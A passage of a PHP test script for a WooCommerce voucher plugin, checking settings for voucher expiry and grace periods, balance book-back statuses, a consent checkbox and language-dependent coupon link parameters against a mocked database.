$GLOBALS['vcap_test_options']['vcap_restore_extension_days'] = '30';
VCAP\Coupons\BookBack::check_restored_card( new VCAP\VoucherRepository(), $v05_order, $v05_card, 10.0 );
$GLOBALS['vcap_test_options']['vcap_restore_extension_days'] = '99999';
VCAP\Coupons\BookBack::check_restored_card( new VCAP\VoucherRepository(), $v05_order, $v05_card, 10.0 );
unset( $GLOBALS['vcap_test_filters']['vcap_restore_extension_days'] );
$GLOBALS['wpdb'] = $v05_saved_wpdb;
check( 'SET-VC-05: no. 6 extension of expired vouchers on booking back – setting takes effect (0 by default, 30, at most 3650) as the default of filter vcap_restore_extension_days', array( 0, 30, 3650 ) === $v05_seen6, wp_json_encode( $v05_seen6 ) );
check( 'SET-VC-05: no. 6 extension – filter wins: with the setting at 30 the filter\'s 0 extends nothing; the order gets the "expired" note instead', 3 === count( $v05_order->notes ) && str_contains( $v05_order->notes[1], 'it has expired' ) && Voucher::STATUS_EXPIRED === $v05_card->status, wp_json_encode( $v05_order->notes ) );
// No. 7: order statuses that charge and book back balances (Coupons\Settlement).
$v05_r7 = array( VCAP\Coupons\Settlement::deduct_statuses(), VCAP\Coupons\Settlement::restore_statuses() );
$GLOBALS['vcap_test_options']['vcap_balance_deduct_statuses']  = array( 'wc-completed', 'on-hold', 'pending', 'completed' );
$GLOBALS['vcap_test_options']['vcap_balance_restore_statuses'] = array( 'cancelled', 'processing' );
$v05_r7[] = VCAP\Coupons\Settlement::deduct_statuses();
$v05_r7[] = VCAP\Coupons\Settlement::restore_statuses();
$GLOBALS['vcap_test_options']['vcap_balance_deduct_statuses']  = '';
$GLOBALS['vcap_test_options']['vcap_balance_restore_statuses'] = array( 'processing' );
$v05_r7[] = VCAP\Coupons\Settlement::deduct_statuses();
$v05_r7[] = VCAP\Coupons\Settlement::restore_statuses();
check(
	'SET-VC-05: no. 7 statuses that charge and book back balances – setting takes effect (charge: paid statuses only, empty = processing/completed; book back: cancelled/refunded/failed only, empty = all three)',
	array( array( 'processing', 'completed' ), array( 'cancelled', 'refunded', 'failed' ), array( 'completed' ), array( 'cancelled' ), array( 'processing', 'completed' ), array( 'cancelled', 'refunded', 'failed' ) ) === $v05_r7
		&& ! isset( VCAP\Coupons\Settlement::deduct_choices()['pending'] ) && array( 'cancelled', 'refunded', 'failed' ) === array_keys( VCAP\Coupons\Settlement::restore_choices() )
		&& str_contains( $v05_src( 'src/Coupons/Settlement.php' ), '$restore_statuses = self::restore_statuses();' ),
	wp_json_encode( $v05_r7 )
);
$GLOBALS['vcap_test_options']['vcap_balance_deduct_statuses']  = array( 'completed' );
$GLOBALS['vcap_test_options']['vcap_balance_restore_statuses'] = array( 'cancelled' );
$v05_seen7 = array();
add_filter( 'vcap_balance_deduct_statuses', static function ( $s ) use ( &$v05_seen7 ) { $v05_seen7[] = $s; return array( 'shipped' ); } );
add_filter( 'vcap_balance_restore_statuses', static function ( $s ) use ( &$v05_seen7 ) { $v05_seen7[] = $s; return array( 'failed' ); } );
$v05_f7 = array( VCAP\Coupons\Settlement::deduct_statuses(), VCAP\Coupons\Settlement::restore_statuses() );
check( 'SET-VC-05: no. 7 statuses – filters vcap_balance_deduct_statuses and vcap_balance_restore_statuses get the setting and win', array( array( 'completed' ), array( 'cancelled' ) ) === $v05_seen7 && array( array( 'shipped' ), array( 'failed' ) ) === $v05_f7 );
check( 'SET-VC-05: TAX.md section 5 describes the refund and cancellation settings (descriptive, to be checked)', str_contains( $v05_src( 'TAX.md' ), '### 5.3 Einstellungen „Erstattung & Storno“ (SET-VC-05) – zu prüfen' ) );
$GLOBALS['vcap_test_filters'] = $v05_saved_filters;
$GLOBALS['vcap_test_options'] = $v05_saved_opts;
// SET-VC-12: consent checkbox at the voucher product (off by default; global setting, per-product switch, filter wins).
echo "SET-VC-12 consent checkbox\n";
$cn_saved_opts    = $GLOBALS['vcap_test_options'];
$cn_saved_filters = $GLOBALS['vcap_test_filters'];
VCAP\SettingsRegistry::reset();
$cn_reg = VCAP\SettingsRegistry::all();
check(
	'SET-VC-12: register – vcap_consent_enabled (bool, default no) and vcap_consent_text (text, empty) are settings of "General" with legal weight, exported; product setting "consent" defaults to "use global" and is listed in wpml-config.xml',
	'no' === $cn_reg['vcap_consent_enabled']['default'] && 'bool' === $cn_reg['vcap_consent_enabled']['type'] && '' === $cn_reg['vcap_consent_enabled']['section'] && $cn_reg['vcap_consent_enabled']['legal'] && $cn_reg['vcap_consent_enabled']['export']
		&& '' === $cn_reg['vcap_consent_text']['default'] && 'text' === $cn_reg['vcap_consent_text']['type'] && $cn_reg['vcap_consent_text']['legal']
		&& '' === ProductConfig::DEFAULTS['consent'] && str_contains( (string) file_get_contents( VCAP_PATH . 'wpml-config.xml' ), '<custom-field action="copy">_vcap_consent</custom-field>' )
		&& in_array( 'vcap_consent_text', VCAP\Compat\Multilingual::OPTIONS, true )
);
$cn_fields = array_column( array_slice( VCAP\Consent::settings_fields(), 0, -1 ), null, 'id' );
check(
	'SET-VC-12: block "Consent checkbox" on "General" builds its fields with SettingsRegistry::field() (checkbox default no, textarea with the default text as placeholder) and says "Not legally checked"',
	'checkbox' === $cn_fields['vcap_consent_enabled']['type'] && 'no' === $cn_fields['vcap_consent_enabled']['default'] && 'textarea' === $cn_fields['vcap_consent_text']['type'] && VCAP\Consent::default_text() === $cn_fields['vcap_consent_text']['placeholder']
		&& str_contains( (string) $cn_fields['vcap_consent']['desc'], 'Not legally checked' ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), 'Consent::settings_fields()' )
);
$cn_cfg     = static fn( array $over = array() ): array => array_merge( ProductConfig::DEFAULTS, $over );
$cn_default = VCAP\Fields::builtin_definitions( $cn_cfg() );
$cn_off     = ! VCAP\Consent::required_for( $cn_cfg() ) && ! isset( $cn_default['consent'] );
$cn_product = VCAP\Consent::required_for( $cn_cfg( array( 'consent' => 'yes' ) ) );
$GLOBALS['vcap_test_options']['vcap_consent_enabled'] = 'yes';
$cn_global  = VCAP\Consent::required_for( $cn_cfg() ) && ! VCAP\Consent::required_for( $cn_cfg( array( 'consent' => 'no' ) ) );
$cn_defs    = VCAP\Fields::builtin_definitions( $cn_cfg() );
add_filter( 'vcap_consent_required', static fn( $required, $config ) => false, 10, 2 );
$cn_filter  = ! VCAP\Consent::required_for( $cn_cfg( array( 'consent' => 'yes' ) ) );
$GLOBALS['vcap_test_filters'] = $cn_saved_filters;
check(
	'SET-VC-12: default off – no checkbox (built-in fields as before); product "yes" shows it with the global setting off, the global setting shows it unless the product says "no"; the filter vcap_consent_required wins',
	$cn_off && $cn_product && $cn_global && $cn_filter && array( 'recipient_name', 'recipient_email', 'message' ) === array_keys( $cn_default ),
	json_encode( array( $cn_off, $cn_product, $cn_global, $cn_filter, array_keys( $cn_default ) ) )
);
check(
	'SET-VC-12: the built-in field is a required checkbox, last of the built-in fields, labelled with the default text while the setting is empty',
	isset( $cn_defs['consent'] ) && 'consent' === array_key_last( $cn_defs ) && 'checkbox' === $cn_defs['consent']['type'] && true === $cn_defs['consent']['required'] && VCAP\Consent::default_text() === $cn_defs['consent']['label']
);
$GLOBALS['vcap_test_options']['vcap_consent_text'] = "Ich möchte die sofortige\nZustellung <b>des Gutscheins</b>.";
add_filter( 'vcap_consent_text', static fn( $text ) => $text . ' (AGB gelesen)' );
$cn_text = VCAP\Consent::text();
$GLOBALS['vcap_test_filters'] = $cn_saved_filters;
check(
	'SET-VC-12: own text – one line of plain text (no HTML), the filter vcap_consent_text wins; saving cleans and cuts it to 500 characters',
	'Ich möchte die sofortige Zustellung des Gutscheins. (AGB gelesen)' === $cn_text && 500 === mb_strlen( VCAP\Consent::sanitize_text( str_repeat( 'ä', 600 ) ) ) && 'x' === VCAP\Consent::sanitize_text( '<i>x</i>' ),
	$cn_text
);
$cn_cart    = array(
	'recipient_name' => array( 'label' => 'Recipient name', 'value' => 'Anna' ),
	'consent'        => array( 'label' => 'Terms read', 'value' => 'Yes' ),
);
$cn_stamped = VCAP\Consent::stamp( $cn_cart, 1795000000 );
$cn_none    = VCAP\Consent::stamp( array( 'recipient_name' => $cn_cart['recipient_name'] ), 1795000000 );
check(
	'SET-VC-12: the order line keeps the text as shown and the time of the order (UTC) in "_vcap_fields" – classic and block checkout (woocommerce_checkout_create_order_line_item); without a consent nothing is added',
	gmdate( 'Y-m-d H:i:s', 1795000000 ) === $cn_stamped['consent']['given_at'] && 'Terms read' === $cn_stamped['consent']['label'] && ! isset( $cn_none['consent'] )
		&& array( 'text' => 'Terms read', 'given_at' => gmdate( 'Y-m-d H:i:s', 1795000000 ) ) === VCAP\Consent::of( $cn_stamped ) && null === VCAP\Consent::of( $cn_none ) && null === VCAP\Consent::of( 'x' )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Fields.php' ), "\$values['vcap_fields'] = Consent::stamp( (array) \$values['vcap_fields'] );" )
);
$cn_item  = new class( $cn_stamped ) {
	public function __construct( private array $fields ) {}
	public function get_meta( $k ) { return '_vcap_fields' === $k ? $this->fields : ''; }
};
$cn_again = ( new VCAP\Fields() )->order_again( array(), $cn_item, null );
check(
	'SET-VC-12: "order again" does not carry the consent over – it is asked anew (the field is required, validate() refuses the line without it)',
	isset( $cn_again['vcap_fields']['recipient_name'] ) && ! isset( $cn_again['vcap_fields']['consent'] ) && str_contains( VCAP\Consent::missing_message( 'Terms read' ), 'Terms read' ),
	json_encode( $cn_again )
);
$cn_voucher         = new VCAP\Voucher();
$cn_voucher->fields = $cn_stamped;
$cn_rows            = VCAP\Consent::export_rows( $cn_voucher->fields );
$cn_privacy         = (string) file_get_contents( VCAP_PATH . 'src/Privacy.php' );
check(
	'SET-VC-12: the WordPress personal data export of a voucher lists the consent with its text and time (and not twice as a plain field)',
	array( array( 'name' => 'Consent', 'value' => 'Terms read' ), array( 'name' => 'Consent given at (UTC)', 'value' => gmdate( 'Y-m-d H:i:s', 1795000000 ) ) ) === $cn_rows && array() === VCAP\Consent::export_rows( array() )
		&& str_contains( $cn_privacy, 'Consent::export_rows( $voucher->fields )' ) && str_contains( $cn_privacy, 'if ( Consent::KEY === (string) $key ) {' ),
	json_encode( $cn_rows )
);
$cn_labels = VCAP\Consent::event_labels( array() );
$cn_note   = VCAP\Consent::note_text( 'x', VCAP\Consent::NOTE, array( 'Terms read', '2026-11-24 10:00:00' ) );
check(
	'SET-VC-12: the voucher history gets "Consent given" (event purchase_consent, reserved in CORE_EVENTS) with the text and the local time; the issuer writes it after "issued"',
	'Consent given' === $cn_labels['purchase_consent'] && '"Terms read" confirmed with the order (24.11.2026 11:00).' === $cn_note && 'x' === VCAP\Consent::note_text( 'x', 'other', array() )
		&& in_array( VCAP\Consent::EVENT, VCAP\API\V1\VoucherService::CORE_EVENTS, true ) && str_contains( (string) file_get_contents( VCAP_PATH . 'src/Issuer.php' ), 'Consent::log( $this->repo, $voucher, $order->get_id() );' ),
	$cn_note
);
$cn_fields_src = (string) file_get_contents( VCAP_PATH . 'src/Fields.php' );
$cn_ps_src     = (string) file_get_contents( VCAP_PATH . 'src/ProductSettings.php' );
check(
	'SET-VC-12: block cart/checkout – the Store API add-to-cart runs the same errors() (required checkbox), the checkout (classic and Store API: woocommerce_check_cart_items) stops a voucher line without the consent; the product screen offers global/yes/no and stores only those',
	str_contains( $cn_fields_src, '$this->check_consent( $values );' ) && str_contains( $cn_fields_src, 'Consent::KEY === (string) $key ? Consent::missing_message( $label )' )
		&& str_contains( $cn_ps_src, "'_vcap_consent', isset( Consent::product_choices()[ \$consent ] ) ? \$consent : ''" ) && array( '', 'yes', 'no' ) === array_keys( VCAP\Consent::product_choices() )
);
$GLOBALS['vcap_test_options'] = $cn_saved_opts;
$GLOBALS['vcap_test_filters'] = $cn_saved_filters;

// SET-VC-24: language-neutral defaults – code prefixes as settings, link parameter by site language for new
// installations, the old parameter "gutschein" stays valid.
echo "SET-VC-24 language-neutral defaults\n";
$ln_saved_opts    = $GLOBALS['vcap_test_options'];
$ln_saved_filters = $GLOBALS['vcap_test_filters'];
$ln_saved_get     = $_GET;
VCAP\SettingsRegistry::reset();
check(
	'SET-VC-24: register – prefixes of bonus and referral codes are settings of "Promotions" with the prefixes of 1.2.0 as default; the link parameter keeps "gutschein" for shops that never saved it; the PDF file name stays "voucher-{coupon_code}" (already neutral)',
	'BONUS' === VCAP\SettingsRegistry::default( 'vcap_bonus_code_prefix' ) && 'FRIEND' === VCAP\SettingsRegistry::default( 'vcap_referral_code_prefix' ) && 'promotions' === VCAP\SettingsRegistry::get( 'vcap_bonus_code_prefix' )['section'] && 'promotions' === VCAP\SettingsRegistry::get( 'vcap_referral_code_prefix' )['section']
		&& 'gutschein' === VCAP\SettingsRegistry::default( 'vcap_coupon_link_param' ) && 'voucher-{coupon_code}' === VCAP\SettingsRegistry::default( 'vcap_pdf_filename' )
);
$ln_bonus = (string) file_get_contents( VCAP_PATH . 'src/Discounts/Bonus.php' );
$ln_ref   = (string) file_get_contents( VCAP_PATH . 'src/Referrals.php' );
$GLOBALS['vcap_test_options']['vcap_bonus_code_prefix'] = 'BONO';
$ln_setting = (string) apply_filters( 'vcap_bonus_code_prefix', (string) VCAP\Settings::value( 'vcap_bonus_code_prefix' ), array(), null );
add_filter( 'vcap_bonus_code_prefix', static fn( $prefix ) => 'PROMO' );
$ln_filter = (string) apply_filters( 'vcap_bonus_code_prefix', (string) VCAP\Settings::value( 'vcap_bonus_code_prefix' ), array(), null );
$GLOBALS['vcap_test_filters'] = $ln_saved_filters;
check(
	'SET-VC-24: bonus and referral codes take their prefix from the setting, the filters vcap_bonus_code_prefix / vcap_referral_code_prefix get it and win',
	'BONO' === $ln_setting && 'PROMO' === $ln_filter
		&& str_contains( $ln_bonus, "apply_filters( 'vcap_bonus_code_prefix', (string) \\VCAP\\Settings::value( 'vcap_bonus_code_prefix' ), \$campaign, \$order )" )
		&& str_contains( $ln_ref, "apply_filters( 'vcap_referral_code_prefix', (string) Settings::value( 'vcap_referral_code_prefix' ) )" )
		&& ! str_contains( $ln_bonus, "'vcap_bonus_code_prefix', 'BONUS'" ) && ! str_contains( $ln_ref, "'vcap_referral_code_prefix', 'FRIEND'" )
);
$ln_settings = new VCAP\Settings();
$ln_kept     = $ln_settings->sanitize_affix( 'B&B', array( 'id' => 'vcap_referral_code_prefix', 'title' => 'Prefix of referral codes' ) );
check(
	'SET-VC-24: a prefix is checked like the code prefix (letters, digits, dot, hyphen, underscore, up to 20): "B&B" is refused and the stored value kept; empty = no prefix is allowed',
	'FRIEND' === $ln_kept && '' === $ln_settings->sanitize_affix( '', array( 'id' => 'vcap_bonus_code_prefix' ) ) && 'GIFT-2026' === $ln_settings->sanitize_affix( ' GIFT-2026 ', array( 'id' => 'vcap_bonus_code_prefix' ) )
		&& str_contains( (string) file_get_contents( VCAP_PATH . 'src/Settings.php' ), "'vcap_code_separator', 'vcap_bonus_code_prefix', 'vcap_referral_code_prefix' ) as \$affix" ),
	(string) $ln_kept
);
check(
	'SET-VC-24 (E10 a): the parameter of a new installation follows the site language – German (de, de_DE, de_AT, de_CH, de_DE_formal) "gutschein", every other language "voucher"',
	'gutschein' === VCAP\CouponLink::fresh_param( 'de_DE' ) && 'gutschein' === VCAP\CouponLink::fresh_param( 'de_AT' ) && 'gutschein' === VCAP\CouponLink::fresh_param( 'de_CH' ) && 'gutschein' === VCAP\CouponLink::fresh_param( 'de_DE_formal' ) && 'gutschein' === VCAP\CouponLink::fresh_param( 'de' )
		&& 'voucher' === VCAP\CouponLink::fresh_param( 'en_US' ) && 'voucher' === VCAP\CouponLink::fresh_param( 'fr_FR' ) && 'voucher' === VCAP\CouponLink::fresh_param( 'nl_NL' ) && 'voucher' === VCAP\CouponLink::fresh_param( 'es_ES' )
);
$ln_install = (string) file_get_contents( VCAP_PATH . 'src/Install.php' );
$ln_first   = (int) strpos( $ln_install, "add_option( 'vcap_coupon_link_param', CouponLink::fresh_param( self::site_locale() ), '', 'yes' );" );
check(
	'SET-VC-24: only a first installation stores it (inside "no version stored yet"), before Settings::store_request_defaults() would store "gutschein"; existing shops keep theirs (default unchanged)',
	$ln_first > 0 && $ln_first < (int) strpos( $ln_install, 'self::upgrade_schema( $installed );' ) && $ln_first > (int) strpos( $ln_install, "if ( '' === self::stored_version() ) {\n\t\t\tadd_option( PaymentVouchers::OPTION" )
		&& ! str_contains( (string) file_get_contents( VCAP_PATH . 'src/SettingsTransfer.php' ), 'fresh_param' )
);
if ( ! function_exists( 'is_multisite' ) ) {
	function is_multisite() { return false; }
}
// A first installation on an English site and on a German site, an existing shop (option stored): add_option() as in activate_site().
unset( $GLOBALS['vcap_test_options']['vcap_coupon_link_param'] );
$GLOBALS['vcap_test_options']['WPLANG'] = 'en_GB';
add_option( 'vcap_coupon_link_param', VCAP\CouponLink::fresh_param( VCAP\Install::site_locale() ), '', 'yes' );
$ln_en = $GLOBALS['vcap_test_options']['vcap_coupon_link_param'];
unset( $GLOBALS['vcap_test_options']['vcap_coupon_link_param'] );
$GLOBALS['vcap_test_options']['WPLANG'] = 'de_AT';
add_option( 'vcap_coupon_link_param', VCAP\CouponLink::fresh_param( VCAP\Install::site_locale() ), '', 'yes' );
$ln_de = $GLOBALS['vcap_test_options']['vcap_coupon_link_param'];
$GLOBALS['vcap_test_options']['vcap_coupon_link_param'] = 'gutschein';
$GLOBALS['vcap_test_options']['WPLANG']                 = 'en_US';
add_option( 'vcap_coupon_link_param', VCAP\CouponLink::fresh_param( VCAP\Install::site_locale() ), '', 'yes' );
check(
	'SET-VC-24: site language from WPLANG – an English site stores "voucher", an Austrian one "gutschein"; an existing shop keeps "gutschein" (add_option never overwrites)',
	'voucher' === $ln_en && 'gutschein' === $ln_de && 'gutschein' === $GLOBALS['vcap_test_options']['vcap_coupon_link_param'],
	json_encode( array( $ln_en, $ln_de ) )
);
// Old links keep working: with the parameter "voucher" set, ?gutschein=CODE is still read (alias), ?voucher=CODE first.
$GLOBALS['vcap_test_options']['vcap_coupon_link_param'] = 'voucher';
$ln_link = new VCAP\CouponLink( new VCAP\Settings() );
$_GET    = array( 'gutschein' => 'SUMMER10' );
$ln_old  = $ln_link->request_param();
$_GET    = array( 'voucher' => 'SUMMER10', 'gutschein' => 'OTHER' );
$ln_new  = $ln_link->request_param();
$_GET    = array( 'coupon' => 'SUMMER10' );
$ln_none = $ln_link->request_param();
$_GET    = array( 'gutschein' => array( 'x' ) );
$ln_arr  = $ln_link->request_param();
$ln_both = $ln_link->params();
$GLOBALS['vcap_test_options']['vcap_coupon_link_param'] = 'gutschein';
$ln_same = ( new VCAP\CouponLink( new VCAP\Settings() ) )->params();
$_GET    = $ln_saved_get;
$ln_src  = (string) file_get_contents( VCAP_PATH . 'src/CouponLink.php' );
check(
	'SET-VC-24: old links work – with the parameter "voucher" a link ?gutschein=CODE is still applied (alias), the parameter set comes first, other parameters and arrays are ignored; with "gutschein" set there is one parameter; the redirect removes both',
	'gutschein' === $ln_old && 'voucher' === $ln_new && null === $ln_none && null === $ln_arr && array( 'voucher', 'gutschein' ) === $ln_both && array( 'gutschein' ) === $ln_same
		&& str_contains( $ln_src, '$param = $this->request_param();' ) && str_contains( $ln_src, 'wp_safe_redirect( remove_query_arg( $this->params() ) );' ),
	json_encode( array( $ln_old, $ln_new, $ln_none, $ln_arr, $ln_same ) )
);
$GLOBALS['vcap_test_options'] = $ln_saved_opts;
$GLOBALS['vcap_test_filters'] = $ln_saved_filters;
check( 'SET-VC-06: a scheduled delivery after the validity date follows the expiry behaviour (grace period / never deliver, "expires" refuses as before)', str_contains( (string) file_get_contents( VCAP_PATH . 'src/Delivery.php' ), 'if ( $voucher->is_expired() ) { // SET-VC-06' ) );
// SET-VC-06: expiry behaviour as a setting ("expires" = 1.2.0, grace period, never expires) and the extension limit
// for staff; filters vcap_expiry_behaviour, vcap_expiry_grace_days, vcap_expiry_staff_extension_days win.
echo "SET-VC-06 expiry behaviour\n";
VCAP\SettingsRegistry::reset();
$x6_opts    = $GLOBALS['vcap_test_options'] ?? array();
$x6_filters = $GLOBALS['vcap_test_filters'] ?? array();
$x6_set     = static function ( array $values ): void {
	foreach ( $values as $k => $v ) {
		if ( null === $v ) {
			unset( $GLOBALS['vcap_test_options'][ $k ] );
		} else {
			$GLOBALS['vcap_test_options'][ $k ] = $v;
		}
	}
};
$x6_def = VCAP\Settings::defaults();
check(
	'SET-VC-06: defaults keep 1.2.0 – expires at the date, grace 30 days (only used with "grace"), staff extension without limit (0); General section, legal weight',
	'expires' === $x6_def['vcap_expiry_behaviour'] && 30 === $x6_def['vcap_expiry_grace_days'] && 0 === $x6_def['vcap_expiry_staff_extension_days'] && 'expires' === VCAP\ExpiryPolicy::behaviour() && 0 === VCAP\ExpiryPolicy::grace_days() && 0 === VCAP\ExpiryPolicy::staff_extension_days()
		&& '' === VCAP\SettingsRegistry::get( 'vcap_expiry_behaviour' )['section'] && VCAP\SettingsRegistry::get( 'vcap_expiry_behaviour' )['legal'] && VCAP\SettingsRegistry::get( 'vcap_expiry_grace_days' )['legal'] && VCAP\SettingsRegistry::get( 'vcap_expiry_staff_extension_days' )['legal']
		&& array( 'expires', 'grace', 'never' ) === VCAP\SettingsRegistry::get( 'vcap_expiry_behaviour' )['choices'] && 1 === VCAP\SettingsRegistry::get( 'vcap_expiry_grace_days' )['min']
);
$x6_v5              = new Voucher();
$x6_v5->status      = Voucher::STATUS_ACTIVE;
$x6_v5->expires_at  = gmdate( 'Y-m-d H:i:s', time() - 5 * DAY_IN_SECONDS );
$x6_v40             = new Voucher();
$x6_v40->status     = Voucher::STATUS_ACTIVE;
$x6_v40->expires_at = gmdate( 'Y-m-d H:i:s', time() - 40 * DAY_IN_SECONDS );
$x6_state           = static fn() => array( $x6_v5->is_expired(), $x6_v40->is_expired(), $x6_v5->is_usable(), '' !== VCAP\ExpiryPolicy::notice( $x6_v5 ) );
$x6_exp             = $x6_state();
$x6_label           = $x6_v5->status_label();
$x6_set( array( 'vcap_expiry_behaviour' => 'grace' ) );
$x6_grace       = $x6_state();
$x6_grace_note  = VCAP\ExpiryPolicy::notice( $x6_v5 );
$x6_grace_label = $x6_v5->status_label();
$x6_set( array( 'vcap_expiry_grace_days' => '3' ) );
$x6_grace3 = $x6_state();
$x6_set( array( 'vcap_expiry_behaviour' => 'never', 'vcap_expiry_grace_days' => null ) );
$x6_never      = $x6_state();
$x6_never_note = VCAP\ExpiryPolicy::notice( $x6_v40 );
check(
	'SET-VC-06: Voucher::is_expired() follows the behaviour – expires: both past-date vouchers expired; grace 30 days: 5 days past still redeemable with a notice, 40 days past expired; grace 3 days: both expired; never: none expired, notice only',
	array( true, true, false, false ) === $x6_exp && array( false, true, true, true ) === $x6_grace && array( true, true, false, false ) === $x6_grace3 && array( false, false, true, true ) === $x6_never
		&& 'Expired' === $x6_label && 'Active (validity date passed)' === $x6_grace_label
		&& str_contains( $x6_grace_note, 'The shop still accepts it until ' ) && str_contains( $x6_never_note, 'The shop still accepts it.' ) && ! str_contains( $x6_never_note, 'until' ),
	json_encode( array( $x6_exp, $x6_grace, $x6_grace3, $x6_never, $x6_label, $x6_grace_label, $x6_grace_note, $x6_never_note ) )
);
$x6_set( array( 'vcap_expiry_behaviour' => 'grace' ) );
$x6_seen = array();
add_filter( 'vcap_expiry_behaviour', static function ( $b ) use ( &$x6_seen ) { $x6_seen[] = $b; return 'never'; } );
$x6_fb_never = array( VCAP\ExpiryPolicy::behaviour(), $x6_v40->is_expired() );
$GLOBALS['vcap_test_filters']['vcap_expiry_behaviour'] = array( array( static fn() => 'bogus', 1 ) );
$x6_fb_bogus = VCAP\ExpiryPolicy::behaviour();
unset( $GLOBALS['vcap_test_filters']['vcap_expiry_behaviour'] );
add_filter( 'vcap_expiry_grace_days', static fn() => 60 );
$x6_fg = array( VCAP\ExpiryPolicy::grace_days(), $x6_v40->is_expired() );
unset( $GLOBALS['vcap_test_filters']['vcap_expiry_grace_days'] );
$x6_set( array( 'vcap_expiry_behaviour' => 'unknown' ) );
$x6_stored_bogus = VCAP\ExpiryPolicy::behaviour();
check(
	'SET-VC-06: filter vcap_expiry_behaviour gets the setting and wins (unknown values = "expires"); filter vcap_expiry_grace_days wins (60 days keep a voucher 40 days past redeemable)',
	array( 'grace', 'grace' ) === $x6_seen && array( 'never', false ) === $x6_fb_never && 'expires' === $x6_fb_bogus && array( 60, false ) === $x6_fg && 'expires' === $x6_stored_bogus,
	json_encode( array( $x6_seen, $x6_fb_never, $x6_fb_bogus, $x6_fg, $x6_stored_bogus ) )
);

// Journal: the daily maintenance books the expiry off only when the grace period ended, never with "never".
$x6_saved_wpdb = $GLOBALS['wpdb'] ?? null;
$x6_fixtures   = array(
	5  => array( 'id' => 5, 'code' => 'X6-FIVE', 'type' => 'giftcard', 'usage_mode' => 'balance', 'status' => 'active', 'initial_amount' => 50, 'balance' => 50, 'currency' => 'EUR', 'discount_type' => 'fixed_cart', 'expires_at' => $x6_v5->expires_at ),
	40 => array( 'id' => 40, 'code' => 'X6-FORTY', 'type' => 'giftcard', 'usage_mode' => 'balance', 'status' => 'active', 'initial_amount' => 20, 'balance' => 20, 'currency' => 'EUR', 'discount_type' => 'fixed_cart', 'expires_at' => $x6_v40->expires_at ),
	99 => array( 'id' => 99, 'code' => 'X6-FUTURE', 'type' => 'giftcard', 'usage_mode' => 'balance', 'status' => 'active', 'initial_amount' => 10, 'balance' => 10, 'currency' => 'EUR', 'discount_type' => 'fixed_cart', 'expires_at' => gmdate( 'Y-m-d H:i:s', time() + 30 * DAY_IN_SECONDS ) ),
);
$x6_db = new class( $x6_fixtures ) {
	public string $prefix     = 'wp_';
	public string $last_error = '';
	public int $insert_id     = 0;
	public array $log         = array();
	public array $inserts     = array();
	private array $expired    = array();
	public function __construct( private array $rows ) {}
	public function prepare( $query, ...$args ) {
		$args = isset( $args[0] ) && is_array( $args[0] ) ? $args[0] : $args;
		return vsprintf( str_replace( array( '%d', '%s', '%i' ), array( '%d', "'%s'", '%s' ), $query ), $args );
	}
	private function cutoff( string $q ): string {
		return preg_match( "/expires_at <=? '([^']+)'/", $q, $m ) ? $m[1] : '';
	}
	private function due( string $q ): array {
		$cut = $this->cutoff( $q );
		return array_values( array_filter( $this->rows, static fn( $r ) => 'active' === $r['status'] && $r['expires_at'] < $cut ) );
	}
	public function get_col( $q, $i = 0 ) {
		$this->log[] = $q;
		return str_starts_with( $q, 'SELECT id FROM' ) ? array_column( $this->due( $q ), 'id' ) : array();
	}
	public function query( $q ) {
		$this->log[] = $q;
		if ( str_starts_with( $q, 'UPDATE' ) && str_contains( $q, "SET status = 'expired'" ) ) {
			$due = $this->due( $q );
			foreach ( $due as $r ) {
				$this->rows[ $r['id'] ]['status'] = 'expired';
				$this->expired[]                  = $r['id'];
			}
			return count( $due );
		}
		return 1;
	}
	public function get_results( $q, $o = null ) {
		$this->log[] = $q;
		if ( str_contains( $q, "status = 'expired' AND updated_at" ) ) {
			$out = array();
			foreach ( $this->expired as $id ) {
				$out[] = $this->rows[ $id ];
			}
			$this->expired = array();
			return $out;
		}
		if ( str_contains( $q, 'AS expired' ) ) { // Ledger::liability(): group the fixtures like the SQL does.
			$cut = $this->cutoff( $q );
			$out = array();
			foreach ( $this->rows as $r ) {
				$key         = (int) ( $r['expires_at'] <= $cut );
				$out[ $key ] = array( 'currency' => 'EUR', 'type' => 'giftcard', 'expired' => $key, 'free' => 0, 'cnt' => ( $out[ $key ]['cnt'] ?? 0 ) + 1, 'amount' => ( $out[ $key ]['amount'] ?? 0 ) + $r['balance'] );
			}
			return array_values( $out );
		}
		return array();
	}
	public function get_var( $q ) { $this->log[] = $q; return null; }
	public function get_row( $q, $o = null ) { $this->log[] = $q; return null; }
	public function insert( $table, $row ) { $this->inserts[] = $row; return 1; }
	public function esc_like( $s ) { return addcslashes( (string) $s, '_%\\' ); }
	public function reset_rows( array $rows ): void { $this->rows = $rows; $this->inserts = array(); $this->log = array(); }
};
$GLOBALS['wpdb'] = $x6_db;
$x6_repo         = new VCAP\VoucherRepository();
$x6_run          = static function ( string $behaviour ) use ( $x6_db, $x6_repo, $x6_fixtures, $x6_set ): array {
	$x6_set( array( 'vcap_expiry_behaviour' => $behaviour ) );
	$x6_db->reset_rows( $x6_fixtures );
	$count  = $x6_repo->expire_overdue();
	$booked = array();
	foreach ( $x6_db->inserts as $row ) {
		if ( 'expired' === $row['event'] ) {
			$booked[ $row['voucher_id'] ] = $row['amount'];
		}
	}
	return array( $count, $booked, count( $x6_db->log ) );
};
$x6_j_exp   = $x6_run( 'expires' );
$x6_j_grace = $x6_run( 'grace' );
$x6_j_never = $x6_run( 'never' );
check(
	'SET-VC-06: journal – "expires" books both past-date cards off (50 + 20); "grace" (30 days) books only the card past its grace period (20), the card in its grace period stays open; "never" books nothing (no query)',
	2 === $x6_j_exp[0] && array( 5 => 50.0, 40 => 20.0 ) == $x6_j_exp[1] && 1 === $x6_j_grace[0] && array( 40 => 20.0 ) == $x6_j_grace[1] && array( 0, array(), 0 ) === $x6_j_never,
	json_encode( array( $x6_j_exp, $x6_j_grace, $x6_j_never ) )
);
if ( ! function_exists( 'get_gmt_from_date' ) ) {
	function get_gmt_from_date( $date, $format = 'Y-m-d H:i:s' ) { return gmdate( $format, (int) strtotime( $date . ' UTC' ) ); } // phpcs:ignore
}
if ( ! function_exists( 'esc_sql' ) ) {
	function esc_sql( $s ) { return addslashes( (string) $s ); } // phpcs:ignore
}
$x6_open = static function ( string $behaviour ) use ( $x6_db, $x6_fixtures, $x6_set ): array {
	$x6_set( array( 'vcap_expiry_behaviour' => $behaviour ) );
	$x6_db->reset_rows( $x6_fixtures );
	$GLOBALS['vcap_test_transients'] = array();
